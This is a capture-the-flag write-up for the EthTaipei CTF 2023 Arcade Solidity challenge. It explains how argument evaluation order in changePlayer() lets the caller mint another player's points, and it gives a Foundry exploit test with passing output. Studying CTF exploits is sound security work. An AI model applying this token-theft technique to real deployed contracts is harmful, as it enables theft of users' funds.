# EthTaipei CTF 2023 - Arcade
- Scope  
    - Arcade.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

### Vulnerability Details
This function calls `_setNewPlayer()` followed by `_redeem()`, and passes the old player's address to `_redeem()` the new player's points, as “indexed parameters are evaluated first in right-to-left order.”
1. Call the function `changePlayer()` and `oldPlayer` will be set to your address (you)
2. The function will then perform a call to `_setNewPlayer()` and switch to player4
3. Following, the function then call `_redeem(oldPlayer)` directly and provide oldPlayer (you) as the address to receive tokens.
(The vulnerability here is because it calls `_redeem()` instead of `redeem()`, which `redeem()` will set the player address to be msg.sender)
4. `_redeem()` will check the points of current player (player4), then then `_mint()` the corresponding tokens to the provided player address (you)
```diff
function changePlayer(address newPlayer) external onlyPlayer {
        address oldPlayer = currentPlayer;
-        emit PlayerChanged(_redeem(oldPlayer), _setNewPlayer(newPlayer));
    }
```

### Impact/Proof of Concept
1. We first fast forward 10mins and then earn 10points then redeem the 10 tokens.
2. Following, we exploit the vulnerability inside `changePlayer()` and transfer player4's 190 points to us and mint it.
```diff
function test_Exploit() public {
        vm.startPrank(you);
        console.log("balance: ",ERC20(arcade).balanceOf(you));
        vm.warp(10 minutes); // require to fast forward 10mins to be able to call earn()
        arcade.earn();
        arcade.redeem();
        arcade.changePlayer(player4);
        console.log("balance: ",ERC20(arcade).balanceOf(you));
    }
```
Results
```diff
[PASS] test_Exploit() (gas: 106286)
Logs:
  balance:  0
  balance:  200
```
